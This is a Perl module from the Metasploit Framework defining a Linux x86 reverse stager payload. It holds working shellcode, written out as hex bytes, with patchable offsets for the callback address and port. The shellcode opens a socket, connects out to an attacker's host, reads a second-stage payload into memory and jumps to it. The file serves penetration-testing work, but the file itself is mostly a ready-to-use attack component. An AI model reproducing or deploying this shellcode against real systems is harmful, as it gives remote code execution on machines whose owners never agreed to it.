###############
##
#
#    Name: ReverseStager.pm
# Version: $Revision$
#  Source: src/shellcode/linux/ia32/stager_sock_reverse.asm
# License:
#
#      This file is part of the Metasploit Exploit Framework
#      and is subject to the same licenses and copyrights as
#      the rest of this package.
#
# Descrip:
#
#      IA32 reverse stager for Linux.
#
##
###############

package Msf::PayloadComponent::Linux::ia32::ReverseStager;

use strict;
use base 'Msf::PayloadComponent::Linux::ReverseStager';

my $info =
{
	Authors       => [ 'skape <mmiller [at] hick.org>' ],
	Arch          => [ 'x86' ],
	Priv          => 0,
	OS            => [ 'linux' ],
	Multistage    => 1,
	Size          => '',
	Payload       =>
		{
			Offsets => 
				{
					LHOST => [ 0x11, 'ADDR' ],
					LPORT => [ 0x17, 'n'    ],
				},
			Payload =>
				"\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x89\xe1\xcd\x80\x97\x5b" .
				"\x68\x7f\x00\x00\x01\x66\x68\xbf\xbf\x66\x53\x89\xe1\x6a\x66\x58" .
				"\x50\x51\x57\x89\xe1\x43\xcd\x80\x5b\x99\xb6\x0c\xb0\x03\xcd\x80" .
				"\xff\xe1"
		}
};

sub new
{
	my $class = shift;
	my $hash  = @_ ? shift : { };
	my $self;

	$hash = $class->MergeHashRec($hash, { Info => $info });
	$self = $class->SUPER::new($hash, @_);

	return $self;
}

1;
